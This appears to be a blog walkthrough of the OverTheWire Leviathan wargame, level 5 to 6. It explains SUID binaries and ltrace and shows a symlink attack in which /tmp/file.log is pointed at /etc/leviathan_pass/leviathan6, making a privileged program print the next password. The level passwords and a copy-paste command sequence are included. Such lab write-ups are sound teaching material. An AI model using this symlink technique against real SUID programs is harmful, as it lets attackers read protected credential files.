---
date: 2023-08-14 00:00:00 +0700
layout: post-with-comments
title: "OverTheWire Leviathan Level 5 → 6 tutorial!!"
permalink: /posts/Over-The-Wire-Leviathan-Level-5-to-6/
tags: [overthewire, leviathan, walkthrough, ctf, linux, beginner, suid, ltrace, symlink]
description: "A step by step tutorial for OverTheWire Leviathan Level 5 → 6!!"
---

<!-- Scoped styles: only affect this post -->

<style>
  .leviathan-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
  .leviathan-nav .nav-left,.leviathan-nav .nav-center,.leviathan-nav .nav-right{flex:1}
  .leviathan-nav .nav-left{text-align:left}
  .leviathan-nav .nav-center{text-align:center}
  .leviathan-nav .nav-right{text-align:right}
  .leviathan-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
  .leviathan-nav a:hover{transform:translateY(-1px)}
  .leviathan-nav .disabled{opacity:.55}
  :root[data-theme='light'] .leviathan-nav a{border-color:rgba(0,0,0,.15)}
</style>

<nav class="leviathan-nav" aria-label="Leviathan level navigation">
  <div class="nav-left">
    <a href="{{ '/posts/overTheWire-Leviathan-Level-4-to-5/' | relative_url }}">← Previous: Level 4 → 5</a>
  </div>

  <div class="nav-center">
    <a href="https://overthewire.org/wargames/leviathan/leviathan6.html" target="_blank" rel="noopener">Official (Level 6) ↗</a>
  </div>

  <div class="nav-right">
    <a href="{{ '/posts/overTheWire-Leviathan-Level-6-to-7/' | relative_url }}">Next: Level 6 → 7 →</a>
  </div>
</nav>

---

## Login

Log in as **leviathan5** using the password from Level 4 → 5.

```bash
ssh leviathan5@leviathan.labs.overthewire.org -p 2223
# password: 0dyxT7F4QD
```

> Why? Each Leviathan level is a different UNIX user. To solve 5 → 6, you must be `leviathan5`.

---

## Task

There’s a **SUID binary** in `leviathan5`’s home. Use it to obtain the password for **leviathan6**.

---

## A little bit of Theory

* **SUID** programs run with the file owner’s privileges (here: `leviathan6`).
* **`ltrace`** shows *library* calls like `fopen`, `printf`, etc.—super useful to see what files a program tries to read.
* **Symlink attacks**: when a program blindly opens a world-writable path (e.g., `/tmp/file.log`), you can point that path at a sensitive file via `ln -s`.

**Further reading:**

* <a href="https://en.wikipedia.org/wiki/Setuid" target="_blank" rel="noopener">setuid — overview</a>
* <a href="https://man7.org/linux/man-pages/man1/ltrace.1.html" target="_blank" rel="noopener">ltrace(1) — Linux manpage</a>
* <a href="https://man7.org/linux/man-pages/man1/ln.1.html" target="_blank" rel="noopener">ln(1) — hard & symbolic links</a>
* <a href="https://en.wikipedia.org/wiki/Symlink_race" target="_blank" rel="noopener">Symlink attacks (TOCTOU)</a>

---

## Solution

1. **List the directory**

   ```bash
   ls -la
   ```

   *Why?* Confirm the presence and ownership/permissions of the SUID binary.

   Example:

   ```
   -r-sr-x--- 1 leviathan6 leviathan5 7560 Aug 26  2019 leviathan5
   ```

   ![inspect]({{ '/assets/images/leviathan/level-5-to-6/inspect.jpg' | relative_url }})

2. **Run it once**

   ```bash
   ./leviathan5
   ```

   *Why?* See baseline behavior. It prints:

   ```
   Cannot find /tmp/file.log
   ```

   ![run]({{ '/assets/images/leviathan/level-5-to-6/run.jpg' | relative_url }})

3. **Trace the file access with `ltrace`**

   ```bash
   ltrace ./leviathan5
   ```

   *Why?* To learn *which* file it’s trying to open and how.

   Output snippet:

   ```
   fopen("/tmp/file.log", "r") = 0
   puts("Cannot find /tmp/file.log")
   ```

   → It tries to **read** `/tmp/file.log`. If we control that path, we control what it prints.

   ![ltrace]({{ '/assets/images/leviathan/level-5-to-6/ltrace.jpg' | relative_url }})

4. **Create the path it expects**

   ```bash
   touch /tmp/file.log
   ./leviathan5
   ```

   *Why?* With the file present, the SUID program will read and print its content (as `leviathan6`). If the file is empty, you’ll see no output—so let’s weaponize it with a symlink.

   ![touch]({{ '/assets/images/leviathan/level-5-to-6/touch.jpg' | relative_url }})

5. **Exploit: point `/tmp/file.log` at the real password**

   ```bash
   rm -f /tmp/file.log
   ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
   ./leviathan5
   ```

   *Why?* Now the SUID binary reads **`/etc/leviathan_pass/leviathan6`** but via the path it trusts.

   You should see the password printed:

   ```
   szo7HDB88w
   ```

   ![decrypt]({{ '/assets/images/leviathan/level-5-to-6/decrypt.jpg' | relative_url }})

---

## Password

```
szo7HDB88w
```

---

## Troubleshooting

* **“Cannot find /tmp/file.log” even after `touch`?** Ensure the path is exactly `/tmp/file.log` (not `~/tmp/file.log`).
* **Symlink didn’t work?** Make sure you removed the old file first: `rm -f /tmp/file.log` before `ln -s ...`.
* **No output after symlink?** Check that the target exists and is readable by the SUID owner: `ls -l /etc/leviathan_pass/leviathan6`.

---

## Copy-paste quick run

```bash
ssh leviathan5@leviathan.labs.overthewire.org -p 2223
# password: 0dyxT7F4QD

cd ~
ls -la
./leviathan5            # → Cannot find /tmp/file.log
ltrace ./leviathan5     # → fopen("/tmp/file.log","r")

rm -f /tmp/file.log
ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
./leviathan5            # → szo7HDB88w

ssh leviathan6@leviathan.labs.overthewire.org -p 2223
# password: szo7HDB88w
```

---

**Congrats 🎉** Classic **symlink trick** against a SUID binary that reads a predictable file in `/tmp`. On to **leviathan6**!

---

## Thanks for reading!

Until next time — **Otsumachi!!** 💖☄️✨

![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})
